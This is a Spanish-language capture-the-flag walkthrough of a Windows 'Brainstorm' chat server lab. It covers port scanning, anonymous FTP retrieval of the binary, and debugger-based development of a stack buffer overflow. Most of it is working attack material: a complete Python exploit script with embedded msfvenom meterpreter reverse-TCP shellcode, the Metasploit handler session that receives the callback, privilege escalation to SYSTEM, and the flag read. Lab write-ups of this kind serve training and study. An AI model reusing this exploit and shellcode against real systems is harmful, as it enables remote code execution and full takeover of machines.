-pn -on nmap_final 10.10.211.15 # nmap 7.94 scan initiated sun sep 24 12:32:39 2023 as: nmap -p21,3389,9999 -sc -sv -pn -on nmap_final 10.10.211.15 nmap scan report for 10.10.211.15 host is up (0.049s latency). port state service version 21/tcp open ftp microsoft ftpd | ftp-syst: |_ syst: windows_nt | ftp-anon: anonymous ftp login allowed (ftp code 230) |_can\u0026#39;t get directory listing: timeout 3389/tcp filtered ms-wbt-server 9999/tcp open abyss? | fingerprint-strings: | landesk-rc, ncp, notesrpc, terminalserver, wmsrequest, afp, giop, ms-sql-s, oracle-tns: | welcome to brainstorm chat (beta) |_ please enter your username (max 20 characters): write a message: 1 service unrecognized despite returning data. if you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : sf-port9999-tcp:v=7.94%i=7%d=9/24%time=651010bd%p=x86_64-pc-linux-gnu%r(la sf:ndesk-rc,63,\u0026#34;welcome\\x20to\\x20brainstorm\\x20chat\\x20\\(beta\\)\\nplease\\x2 sf:0enter\\x20your\\x20username\\x20\\(max\\x2020\\x20characters\\):\\x20write\\x20 sf:a\\x20message:\\x20\u0026#34;)%r(terminalserver,63,\u0026#34;welcome\\x20to\\x20brainstorm\\x2 sf:0chat\\x20\\(beta\\)\\nplease\\x20enter\\x20your\\x20username\\x20\\(max\\x2020\\x sf:20characters\\):\\x20write\\x20a\\x20message:\\x20\u0026#34;)%r(ncp,63,\u0026#34;welcome\\x20to sf:\\x20brainstorm\\x20chat\\x20\\(beta\\)\\nplease\\x20enter\\x20your\\x20username sf:\\x20\\(max\\x2020\\x20characters\\):\\x20write\\x20a\\x20message:\\x20\u0026#34;)%r(note sf:srpc,63,\u0026#34;welcome\\x20to\\x20brainstorm\\x20chat\\x20\\(beta\\)\\nplease\\x20ent sf:er\\x20your\\x20username\\x20\\(max\\x2020\\x20characters\\):\\x20write\\x20a\\x2 sf:0message:\\x20\u0026#34;)%r(wmsrequest,63,\u0026#34;welcome\\x20to\\x20brainstorm\\x20chat\\x2 sf:0\\(beta\\)\\nplease\\x20enter\\x20your\\x20username\\x20\\(max\\x2020\\x20charac sf:ters\\):\\x20write\\x20a\\x20message:\\x20\u0026#34;)%r(oracle-tns,63,\u0026#34;welcome\\x20to\\ sf:x20brainstorm\\x20chat\\x20\\(beta\\)\\nplease\\x20enter\\x20your\\x20username\\ sf:x20\\(max\\x2020\\x20characters\\):\\x20write\\x20a\\x20message:\\x20\u0026#34;)%r(ms-sq sf:l-s,63,\u0026#34;welcome\\x20to\\x20brainstorm\\x20chat\\x20\\(beta\\)\\nplease\\x20ente sf:r\\x20your\\x20username\\x20\\(max\\x2020\\x20characters\\):\\x20write\\x20a\\x20 sf:message:\\x20\u0026#34;)%r(afp,63,\u0026#34;welcome\\x20to\\x20brainstorm\\x20chat\\x20\\(beta\\ sf:)\\nplease\\x20enter\\x20your\\x20username\\x20\\(max\\x2020\\x20characters\\):\\ sf:x20write\\x20a\\x20message:\\x20\u0026#34;)%r(giop,63,\u0026#34;welcome\\x20to\\x20brainstorm\\ sf:x20chat\\x20\\(beta\\)\\nplease\\x20enter\\x20your\\x20username\\x20\\(max\\x2020 sf:\\x20characters\\):\\x20write\\x20a\\x20message:\\x20\u0026#34;); service info: os: windows; cpe: cpe:/o:microsoft:windows service detection performed. please report any incorrect results at https://nmap.org/submit/ . # nmap done at sun sep 24 12:35:50 2023 -- 1 ip address (1 host up) scanned in 191.22 seconds como podemos ver, tenemos 3 puertos abiertos: 21, 3389 y 9999. el puerto 21 es el puerto del servicio ftp, el puerto 3389 es el puerto del servicio rdp y el puerto 9999 es el puerto del servicio abyss web server.\nenumeración del servicio ftp accedemos al servicio ftp con las credenciales anónimas que nos ha dado nmap y vemos que hay un archivo llamado \u0026ldquo;chatserver.exe\u0026rdquo; y un fichero dll. lo descargamos y lo analizamos con immunity debugger.\nftp 10.10.18.125 -p 21 connected to 10.10.18.125. 220 microsoft ftp service name (10.10.18.125:k3ss): anonymous 331 anonymous access allowed, send identity (e-mail name) as password. password: 230 user logged in. remote system type is windows_nt. ftp\u0026gt; passive passive mode: off; fallback to active mode: off. ftp\u0026gt; binary 200 type set to i. ftp\u0026gt; ls 200 eprt command successful. 125 data connection already open; transfer starting. 08-29-19 08:36pm \u0026lt;dir\u0026gt; chatserver 226 transfer complete. ftp\u0026gt; cd chatserver 250 cwd command successful. ftp\u0026gt; ll ?invalid command. ftp\u0026gt; ls 200 eprt command successful. 125 data connection already open; transfer starting. 08-29-19 10:26pm 43747 chatserver.exe 08-29-19 10:27pm 30761 essfunc.dll 226 transfer complete. ftp\u0026gt; mget . mget chatserver.exe [anpqy?]? y 200 eprt command successful. 125 data connection already open; transfer starting. 100% || 43747 181.87 kib/s 00:00 eta 226 transfer complete. 43747 bytes received in 00:00 (181.77 kib/s) mget essfunc.dll [anpqy?]? y 200 eprt command successful. 125 data connection already open; transfer starting. 100% || 30761 160.83 kib/s 00:00 eta 226 transfer complete. 30761 bytes received in 00:00 (160.71 kib/s) ftp\u0026gt; exit 221 goodbye. análisis del binario con immunity debugger abrimos el binario con immunity debugger y vemos que se trata de un servidor de chat que se ejecuta en windows. lo primero que haremos será probar el servidor de chat para ver cómo funciona. para ello, lo ejecutamos y nos conectamos con netcat al puerto 9999.\n❯ nc -nv 192.168.1.109 9999 connection to 192.168.1.109 9999 port [tcp/*] succeeded! welcome to brainstorm chat (beta) please enter your username (max 20 characters): k3ss write a message: this is a test message sun oct 01 17:45:03 2023 k3ss said: this is a test message pruebo a enviar un mensaje con más de 20 caracteres y veo que el servidor lo corta. pruebo a enviar un mensaje con 3000 caracteres y descubro que el servidor no lo corta, por lo que es vulnerable a un buffer overflow.\npython -c ´print \u0026#34;a\u0026#34;*3000´ preparo la carpeta de trabajo de inmunity debugger con el siguiente comando:\n!mona config -set workingfolder c:\\mona\\%p y ejecuto el servidor de chat con inmunity debugger. una vez ejecutado, me conecto con netcat al puerto 9999 y envío un mensaje con 3000 caracteres. en inmunity debugger, veo que el programa se ha roto y que el registro eip contiene 41414141, que son los caracteres \u0026ldquo;aaaa\u0026rdquo; en hexadecimal. esto significa que el programa se ha roto en el registro eip, por lo que el servidor de chat es vulnerable a un buffer overflow. preparo un script python y lo ejecuto para ver cuántos caracteres se necesitan para sobreescribir el registro eip.\nimport socket ip = \u0026#34;ip_address\u0026#34; port = 9999 prefix = \u0026#34;k3ss \u0026#34; offset = 0 overflow = \u0026#34;a\u0026#34; * offset retn = \u0026#34;\u0026#34; padding = \u0026#34;\u0026#34; payload = \u0026#34;a\u0026#34; * 3000 postfix = \u0026#34;\u0026#34; buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.af_inet, socket.sock_stream) try: s.connect((ip, port)) print(\u0026#34;sending evil buffer...\u0026#34;) s.recv(1024) s.send(bytes(prefix + \u0026#34;\\r\\n\u0026#34;,\u0026#34;latin-1\u0026#34;)) s.recv(1024) s.send(bytes(buffer + \u0026#34;\\r\\n\u0026#34;, \u0026#34;latin-1\u0026#34;)) s.recv(1024) print(\u0026#34;done!\u0026#34;) except exception as e: print(f\u0026#34;an error occurred: {e}\u0026#34;) dentro del bloque del try tengo que replicar el comportamiento del servidor de chat, por lo que primero me conecto al servidor, luego recibo el mensaje de bienvenida, luego envío el nombre de usuario, luego recibo el mensaje de bienvenida y luego envío el mensaje con el buffer. ejecuto el script y veo que el registro eip se ha sobrescrito con 41414141, por lo que el servidor de chat es vulnerable a un buffer overflow. ahora tengo que encontrar un patrón único para saber cuántos caracteres se necesitan para sobrescribir el registro eip.\nmsf-pattern_create -l 3000 aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2ad3ad4ad5ad6ad7ad8ad9ae0ae1ae2ae3ae4ae5ae6ae7ae8ae9af0af1af2af3af4af5af6af7af8af9ag0ag1ag2ag3ag4ag5ag6ag7ag8ag9ah0ah1ah2ah3ah4ah5ah6ah7ah8ah9ai0ai1ai2ai3ai4ai5ai6ai7ai8ai9aj0aj1aj2aj3aj4aj5aj6aj7aj8aj9ak0ak1ak2ak3ak4ak5ak6ak7ak8ak9al0al1al2al3al4al5al6al7al8al9am0am1am2am3am4am5am6am7am8am9an0an1an2an3an4an5an6an7an8an9ao0ao1ao2ao3ao4ao5ao6ao7ao8ao9ap0ap1ap2ap3ap4ap5ap6ap7ap8ap9aq0aq1aq2aq3aq4aq5aq6aq7aq8aq9ar0ar1ar2ar3ar4ar5ar6ar7ar8ar9as0as1as2as3as4as5as6as7as8as9at0at1at2at3at4at5at6at7at8at9au0au1au2au3au4au5au6au7au8au9av0av1av2av3av4av5av6av7av8av9aw0aw1aw2aw3aw4aw5aw6aw7aw8aw9ax0ax1ax2ax3ax4ax5ax6ax7ax8ax9ay0ay1ay2ay3ay4ay5ay6ay7ay8ay9az0az1az2az3az4az5az6az7az8az9ba0ba1ba2ba3ba4ba5ba6ba7ba8ba9bb0bb1bb2bb3bb4bb5bb6bb7bb8bb9bc0bc1bc2bc3bc4bc5bc6bc7bc8bc9bd0bd1bd2bd3bd4bd5bd6bd7bd8bd9be0be1be2be3be4be5be6be7be8be9bf0bf1bf2bf3bf4bf5bf6bf7bf8bf9bg0bg1bg2bg3bg4bg5bg6bg7bg8bg9bh0bh1bh2bh3bh4bh5bh6bh7bh8bh9bi0bi1bi2bi3bi4bi5bi6bi7bi8bi9bj0bj1bj2bj3bj4bj5bj6bj7bj8bj9bk0bk1bk2bk3bk4bk5bk6bk7bk8bk9bl0bl1bl2bl3bl4bl5bl6bl7bl8bl9bm0bm1bm2bm3bm4bm5bm6bm7bm8bm9bn0bn1bn2bn3bn4bn5bn6bn7bn8bn9bo0bo1bo2bo3bo4bo5bo6bo7bo8bo9bp0bp1bp2bp3bp4bp5bp6bp7bp8bp9bq0bq1bq2bq3bq4bq5bq6bq7bq8bq9br0br1br2br3br4br5br6br7br8br9bs0bs1bs2bs3bs4bs5bs6bs7bs8bs9bt0bt1bt2bt3bt4bt5bt6bt7bt8bt9bu0bu1bu2bu3bu4bu5bu6bu7bu8bu9bv0bv1bv2bv3bv4bv5bv6bv7bv8bv9bw0bw1bw2bw3bw4bw5bw6bw7bw8bw9bx0bx1bx2bx3bx4bx5bx6bx7bx8bx9by0by1by2by3by4by5by6by7by8by9bz0bz1bz2bz3bz4bz5bz6bz7bz8bz9ca0ca1ca2ca3ca4ca5ca6ca7ca8ca9cb0cb1cb2cb3cb4cb5cb6cb7cb8cb9cc0cc1cc2cc3cc4cc5cc6cc7cc8cc9cd0cd1cd2cd3cd4cd5cd6cd7cd8cd9ce0ce1ce2ce3ce4ce5ce6ce7ce8ce9cf0cf1cf2cf3cf4cf5cf6cf7cf8cf9cg0cg1cg2cg3cg4cg5cg6cg7cg8cg9ch0ch1ch2ch3ch4ch5ch6ch7ch8ch9ci0ci1ci2ci3ci4ci5ci6ci7ci8ci9cj0cj1cj2cj3cj4cj5cj6cj7cj8cj9ck0ck1ck2ck3ck4ck5ck6ck7ck8ck9cl0cl1cl2cl3cl4cl5cl6cl7cl8cl9cm0cm1cm2cm3cm4cm5cm6cm7cm8cm9cn0cn1cn2cn3cn4cn5cn6cn7cn8cn9co0co1co2co3co4co5co6co7co8co9cp0cp1cp2cp3cp4cp5cp6cp7cp8cp9cq0cq1cq2cq3cq4cq5cq6cq7cq8cq9cr0cr1cr2cr3cr4cr5cr6cr7cr8cr9cs0cs1cs2cs3cs4cs5cs6cs7cs8cs9ct0ct1ct2ct3ct4ct5ct6ct7ct8ct9cu0cu1cu2cu3cu4cu5cu6cu7cu8cu9cv0cv1cv2cv3cv4cv5cv6cv7cv8cv9cw0cw1cw2cw3cw4cw5cw6cw7cw8cw9cx0cx1cx2cx3cx4cx5cx6cx7cx8cx9cy0cy1cy2cy3cy4cy5cy6cy7cy8cy9cz0cz1cz2cz3cz4cz5cz6cz7cz8cz9da0da1da2da3da4da5da6da7da8da9db0db1db2db3db4db5db6db7db8db9dc0dc1dc2dc3dc4dc5dc6dc7dc8dc9dd0dd1dd2dd3dd4dd5dd6dd7dd8dd9de0de1de2de3de4de5de6de7de8de9df0df1df2df3df4df5df6df7df8df9dg0dg1dg2dg3dg4dg5dg6dg7dg8dg9dh0dh1dh2dh3dh4dh5dh6dh7dh8dh9di0di1di2di3di4di5di6di7di8di9dj0dj1dj2dj3dj4dj5dj6dj7dj8dj9dk0dk1dk2dk3dk4dk5dk6dk7dk8dk9dl0dl1dl2dl3dl4dl5dl6dl7dl8dl9dm0dm1dm2dm3dm4dm5dm6dm7dm8dm9dn0dn1dn2dn3dn4dn5dn6dn7dn8dn9do0do1do2do3do4do5do6do7do8do9dp0dp1dp2dp3dp4dp5dp6dp7dp8dp9dq0dq1dq2dq3dq4dq5dq6dq7dq8dq9dr0dr1dr2dr3dr4dr5dr6dr7dr8dr9ds0ds1ds2ds3ds4ds5ds6ds7ds8ds9dt0dt1dt2dt3dt4dt5dt6dt7dt8dt9du0du1du2du3du4du5du6du7du8du9dv0dv1dv2dv3dv4dv5dv6dv7dv8dv9 añado el patrón creado al payload del script y lo ejecuto tras poner en marcha de nuevo el chatserver con inmunity debugger. lanzo el script y obtengo el valor del registro eip. lo copio y lo pego en el comando msf-pattern_offset para saber cuántos caracteres se necesitan para sobrescribir el registro eip.\nmsf-pattern_offset -q 43396f43 -l 3000 [*] exact match at offset 2007 el siguiente paso es encontrar los badcharacters que pueden estropear mi payload. para ello, ejecuto los siguientes comandos en inmunity debugger:\n# crear archivo bytearray.bin con el primer badcharacter !mona bytearray -b \u0026#34;\\x00\u0026#34; # comparar referenciando al address con esp !mona compare -f c:\\mona\\chatserver\\bytearray.bin -a esp ahora solo tengo que añadir todos los badcharacters al payload del script y ejecutarlo para ver cuáles son los badcharacters que pueden afectar al payload.\nfrom __future__ import print_function for x in range(1, 256): print(\u0026#34;\\\\x\u0026#34; + \u0026#34;{:02x}\u0026#34;.format(x), end=\u0026#39;\u0026#39;) print() python3 badcharacters.py \\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff al lanzar de nuevo el script, ejecuto el comando compare de mona y veo que no hay mas caracteres que el \\x00\n!mona compare -f c:\\mona\\chatserver\\bytearray.bin -a esp una vez hecho esto, tengo que encontrar un salto a una instrucción jmp esp para sobrescribir el registro eip y que apunte a la instrucción jmp esp. para ello, ejecuto el siguiente comando en inmunity debugger:\n!mona jmp -r esp -cpb \u0026#34;\\x00\u0026#34; una de las direcciones de salto que me devuelve es 625014df. ahora solo tengo que añadir esta dirección transformada al payload del script y ejecutarlo para ver si sobrescribe el registro eip con la dirección de salto. la paso por un script de python para que me devuelva la dirección de salto en el formato que necesito.\nimport sys if len(sys.argv) != 2: print(\u0026#34;[*] run:\\n\\tjump_address.py \u0026lt;jump_point_address\u0026gt;\u0026#34;) sys.exit(1) address = sys.argv[1] n1 = address[0:2] n2 = address[2:4] n3 = address[4:6] n4 = address[6:8] print(\u0026#34;\\nretn = \u0026#34; + \u0026#34;\\\u0026#34;\\\\x\u0026#34; + n4 + \u0026#34;\\\\x\u0026#34; + n3 +\u0026#34;\\\\x\u0026#34; + n2 +\u0026#34;\\\\x\u0026#34; + n1+\u0026#34;\\\u0026#34;\u0026#34;) python jump_address.py 625014df con esto ya estoy listo para sobrescribir el registro eip con la dirección de salto. ahora solo tengo que añadir el shellcode al payload del script y ejecutarlo para ver si se ejecuta el shellcode.\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 exitfunc=process -b \u0026#34;\\x00\u0026#34; -f c [-] no platform was selected, choosing msf::module::platform::windows from the payload [-] no arch selected, selecting arch: x86 from the payload found 12 compatible encoders attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 381 (iteration=0) x86/shikata_ga_nai chosen with final size 381 payload size: 381 bytes final size of c file: 1632 bytes unsigned char buf[] = \u0026#34;\\xba\\x54\\x0b\\x6e\\x5c\\xda\\xd6\\xd9\\x74\\x24\\xf4\\x5e\\x31\\xc9\u0026#34; \u0026#34;\\xb1\\x59\\x31\\x56\\x14\\x83\\xc6\\x04\\x03\\x56\\x10\\xb6\\xfe\\x92\u0026#34; \u0026#34;\\xb4\\xb9\\x01\\x6b\\x45\\xa5\\x30\\xb9\\x21\\xae\\x61\\x0d\\x23\\x55\u0026#34; \u0026#34;\\x0e\\x3f\\x3f\\x1e\\x43\\xd4\\x30\\x97\\x2e\\xf2\\xc5\\xa5\\x86\\xcb\u0026#34; \u0026#34;\\x26\\x78\\x17\\x87\\xe5\\x1b\\xeb\\xda\\x39\\xfb\\xd2\\x14\\x4c\\xfa\u0026#34; \u0026#34;\\x13\\xe3\\x3a\\x13\\xc9\\xa3\\x4f\\xb9\\xfe\\xc0\\x12\\x01\\xfe\\x06\u0026#34; \u0026#34;\\x19\\x39\\x78\\x22\\xde\\xcd\\x34\\x2d\\x0f\\xa6\\x9d\\x0d\\xff\\xb9\u0026#34; \u0026#34;\\xce\\xc5\\xb7\\xa1\\x75\\x10\\x33\\xed\\x44\\x5c\\xf5\\x86\\x93\\x29\u0026#34; \u0026#34;\\x07\\x4e\\xea\\xed\\xa4\\xaf\\xc2\\xe3\\xb5\\xe8\\xe5\\x1b\\xc0\\x02\u0026#34; \u0026#34;\\x16\\xa1\\xd3\\xd1\\x64\\x7d\\x51\\xc5\\xcf\\xf6\\xc1\\x21\\xf1\\xdb\u0026#34; \u0026#34;\\x94\\xa2\\xfd\\x90\\xd3\\xec\\xe1\\x27\\x37\\x87\\x1e\\xa3\\xb6\\x47\u0026#34; \u0026#34;\\x97\\xf7\\x9c\\x43\\xf3\\xac\\xbd\\xd2\\x59\\x02\\xc1\\x04\\x05\\xfb\u0026#34; \u0026#34;\\x67\\x4f\\xa4\\xea\\x18\\xb0\\x36\\x13\\x45\\x26\\xfa\\xde\\x76\\xb6\u0026#34; \u0026#34;\\x94\\x69\\x04\\x84\\x3b\\xc2\\x82\\xa4\\xb4\\xcc\\x55\\xbd\\xd3\\xee\u0026#34; \u0026#34;\\x8a\\x05\\xb3\\x10\\x2b\\x75\\x9d\\xd6\\x7f\\x25\\xb5\\xff\\xff\\xae\u0026#34; \u0026#34;\\x45\\xff\\xd5\\x5a\\x4c\\x97\\x15\\x32\\x68\\x66\\xfe\\x40\\x89\\x79\u0026#34; \u0026#34;\\xa2\\xcd\\x6f\\x29\\x0a\\x9d\\x3f\\x8a\\xfa\\x5d\\x90\\x62\\x11\\x52\u0026#34; \u0026#34;\\xcf\\x93\\x1a\\xb9\\x78\\x39\\xf5\\x17\\xd0\\xd6\\x6c\\x32\\xaa\\x47\u0026#34; \u0026#34;\\x70\\xe9\\xd6\\x48\\xfa\\x1b\\x26\\x06\\x0b\\x6e\\x34\\x7f\\x6c\\x90\u0026#34; \u0026#34;\\xc4\\x80\\x19\\x90\\xae\\x84\\x8b\\xc7\\x46\\x87\\xea\\x2f\\xc9\\x78\u0026#34; \u0026#34;\\xd9\\x2c\\x0e\\x86\\x9c\\x04\\x64\\xb1\\x0a\\x28\\x12\\xbe\\xda\\xa8\u0026#34; \u0026#34;\\xe2\\xe8\\xb0\\xa8\\x8a\\x4c\\xe1\\xfb\\xaf\\x92\\x3c\\x68\\x7c\\x07\u0026#34; \u0026#34;\\xbf\\xd8\\xd0\\x80\\xd7\\xe6\\x0f\\xe6\\x77\\x19\\x7a\\x74\\x7f\\xe5\u0026#34; \u0026#34;\\xf8\\x53\\xd8\\x8d\\x02\\xe4\\xd8\\x4d\\x69\\xe4\\x88\\x25\\x66\\xcb\u0026#34; \u0026#34;\\x27\\x85\\x87\\xc6\\x6f\\x8d\\x02\\x87\\xc2\\x2c\\x12\\x82\\x83\\xf0\u0026#34; \u0026#34;\\x13\\x21\\x18\\x03\\x69\\x4a\\x9f\\xe4\\x8e\\x42\\xc4\\xe5\\x8e\\x6a\u0026#34; \u0026#34;\\xfa\\xda\\x58\\x53\\x88\\x1d\\x59\\xe0\\x83\\x28\\xfc\\x41\\x0e\\x52\u0026#34; \u0026#34;\\x52\\x91\\x1b\u0026#34;; añado el padding y el return, ademas del payload creado. el script final quedaría así:\nimport socket ip = \u0026#34;192.168.1.109\u0026#34; port = 9999 prefix = \u0026#34;k3ss \u0026#34; offset = 2007 overflow = \u0026#34;a\u0026#34; * offset retn = \u0026#34;\\xdf\\x14\\x50\\x62\u0026#34; padding = \u0026#34;\\x90\u0026#34; * 16 payload = ( \u0026#34;\\xba\\x54\\x0b\\x6e\\x5c\\xda\\xd6\\xd9\\x74\\x24\\xf4\\x5e\\x31\\xc9\u0026#34; \u0026#34;\\xb1\\x59\\x31\\x56\\x14\\x83\\xc6\\x04\\x03\\x56\\x10\\xb6\\xfe\\x92\u0026#34; \u0026#34;\\xb4\\xb9\\x01\\x6b\\x45\\xa5\\x30\\xb9\\x21\\xae\\x61\\x0d\\x23\\x55\u0026#34; \u0026#34;\\x0e\\x3f\\x3f\\x1e\\x43\\xd4\\x30\\x97\\x2e\\xf2\\xc5\\xa5\\x86\\xcb\u0026#34; \u0026#34;\\x26\\x78\\x17\\x87\\xe5\\x1b\\xeb\\xda\\x39\\xfb\\xd2\\x14\\x4c\\xfa\u0026#34; \u0026#34;\\x13\\xe3\\x3a\\x13\\xc9\\xa3\\x4f\\xb9\\xfe\\xc0\\x12\\x01\\xfe\\x06\u0026#34; \u0026#34;\\x19\\x39\\x78\\x22\\xde\\xcd\\x34\\x2d\\x0f\\xa6\\x9d\\x0d\\xff\\xb9\u0026#34; \u0026#34;\\xce\\xc5\\xb7\\xa1\\x75\\x10\\x33\\xed\\x44\\x5c\\xf5\\x86\\x93\\x29\u0026#34; \u0026#34;\\x07\\x4e\\xea\\xed\\xa4\\xaf\\xc2\\xe3\\xb5\\xe8\\xe5\\x1b\\xc0\\x02\u0026#34; \u0026#34;\\x16\\xa1\\xd3\\xd1\\x64\\x7d\\x51\\xc5\\xcf\\xf6\\xc1\\x21\\xf1\\xdb\u0026#34; \u0026#34;\\x94\\xa2\\xfd\\x90\\xd3\\xec\\xe1\\x27\\x37\\x87\\x1e\\xa3\\xb6\\x47\u0026#34; \u0026#34;\\x97\\xf7\\x9c\\x43\\xf3\\xac\\xbd\\xd2\\x59\\x02\\xc1\\x04\\x05\\xfb\u0026#34; \u0026#34;\\x67\\x4f\\xa4\\xea\\x18\\xb0\\x36\\x13\\x45\\x26\\xfa\\xde\\x76\\xb6\u0026#34; \u0026#34;\\x94\\x69\\x04\\x84\\x3b\\xc2\\x82\\xa4\\xb4\\xcc\\x55\\xbd\\xd3\\xee\u0026#34; \u0026#34;\\x8a\\x05\\xb3\\x10\\x2b\\x75\\x9d\\xd6\\x7f\\x25\\xb5\\xff\\xff\\xae\u0026#34; \u0026#34;\\x45\\xff\\xd5\\x5a\\x4c\\x97\\x15\\x32\\x68\\x66\\xfe\\x40\\x89\\x79\u0026#34; \u0026#34;\\xa2\\xcd\\x6f\\x29\\x0a\\x9d\\x3f\\x8a\\xfa\\x5d\\x90\\x62\\x11\\x52\u0026#34; \u0026#34;\\xcf\\x93\\x1a\\xb9\\x78\\x39\\xf5\\x17\\xd0\\xd6\\x6c\\x32\\xaa\\x47\u0026#34; \u0026#34;\\x70\\xe9\\xd6\\x48\\xfa\\x1b\\x26\\x06\\x0b\\x6e\\x34\\x7f\\x6c\\x90\u0026#34; \u0026#34;\\xc4\\x80\\x19\\x90\\xae\\x84\\x8b\\xc7\\x46\\x87\\xea\\x2f\\xc9\\x78\u0026#34; \u0026#34;\\xd9\\x2c\\x0e\\x86\\x9c\\x04\\x64\\xb1\\x0a\\x28\\x12\\xbe\\xda\\xa8\u0026#34; \u0026#34;\\xe2\\xe8\\xb0\\xa8\\x8a\\x4c\\xe1\\xfb\\xaf\\x92\\x3c\\x68\\x7c\\x07\u0026#34; \u0026#34;\\xbf\\xd8\\xd0\\x80\\xd7\\xe6\\x0f\\xe6\\x77\\x19\\x7a\\x74\\x7f\\xe5\u0026#34; \u0026#34;\\xf8\\x53\\xd8\\x8d\\x02\\xe4\\xd8\\x4d\\x69\\xe4\\x88\\x25\\x66\\xcb\u0026#34; \u0026#34;\\x27\\x85\\x87\\xc6\\x6f\\x8d\\x02\\x87\\xc2\\x2c\\x12\\x82\\x83\\xf0\u0026#34; \u0026#34;\\x13\\x21\\x18\\x03\\x69\\x4a\\x9f\\xe4\\x8e\\x42\\xc4\\xe5\\x8e\\x6a\u0026#34; \u0026#34;\\xfa\\xda\\x58\\x53\\x88\\x1d\\x59\\xe0\\x83\\x28\\xfc\\x41\\x0e\\x52\u0026#34; \u0026#34;\\x52\\x91\\x1b\u0026#34;) postfix = \u0026#34;\u0026#34; buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.af_inet, socket.sock_stream) try: s.connect((ip, port)) print(\u0026#34;sending evil buffer...\u0026#34;) s.recv(1024) s.send(bytes(prefix + \u0026#34;\\r\\n\u0026#34;,\u0026#34;latin-1\u0026#34;)) s.recv(1024) s.send(bytes(buffer + \u0026#34;\\r\\n\u0026#34;, \u0026#34;latin-1\u0026#34;)) s.recv(1024) print(\u0026#34;done!\u0026#34;) except exception as e: print(f\u0026#34;an error occurred: {e}\u0026#34;) pongo a escuchar metasploit y ejecuto el script. veo que se ha ejecutado el shellcode y que tengo una sesión de meterpreter.\nmsf6 \u0026gt; use exploit/multi/handler [*] using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp payload =\u0026gt; windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) \u0026gt; set lhost 192.168.56.1 lhost =\u0026gt; 192.168.56.1 msf6 exploit(multi/handler) \u0026gt; run [*] started reverse tcp handler on 192.168.56.1:4444 [*] sending stage (175686 bytes) to 192.168.56.101 [*] meterpreter session 1 opened (192.168.56.1:4444 -\u0026gt; 192.168.56.101:49510) at 2023-10-01 18:24:31 +0200 meterpreter \u0026gt; getuid server username: usuario-pc\\usuario meterpreter \u0026gt; getsystem ...got system via technique 1 (named pipe impersonation (in memory/admin)). meterpreter \u0026gt; getuid server username: nt authority\\system meterpreter \u0026gt; atacando al servidor objetivo como ya tengo un script que me permite explotar la vulnerabilidad, solo tengo que cambiar la ip y el puerto del servidor objetivo y ejecutar el script. pongo a escuchar metasploit y ejecuto el script. veo que se ha ejecutado el shellcode y que tengo una sesión de meterpreter.\n[*] started reverse tcp handler on 10.14.50.184:4444 [*] sending stage (175686 bytes) to 10.10.21.205 [*] meterpreter session 3 opened (10.14.50.184:4444 -\u0026gt; 10.10.21.205:49163) at 2023-10-01 13:31:48 +0200 meterpreter \u0026gt; getuid server username: nt authority\\system meterpreter \u0026gt; cd c [-] stdapi_fs_chdir: operation failed: the system cannot find the file specified. meterpreter \u0026gt; cd .. meterpreter \u0026gt; cd .. meterpreter \u0026gt; pwd c:\\ meterpreter \u0026gt; cd users\\\\ meterpreter \u0026gt; cd drake\\\\ meterpreter \u0026gt; cd desktop\\\\ meterpreter \u0026gt; ls listing: c:\\users\\drake\\desktop =============================== mode size type last modified name ---- ---- ---- ------------- ---- 100666/rw-rw-rw- 282 fil 2019-08-30 07:21:08 +0200 desktop.ini 100666/rw-rw-rw- 32 fil 2019-08-30 07:55:40 +0200 root.txt meterpreter \u0026gt; cat root.txt 5b1001de5a44eca47eee71e7942a8f8a meterpreter \u0026gt; de esta forma obtengo la flag root.txt y finalizo la 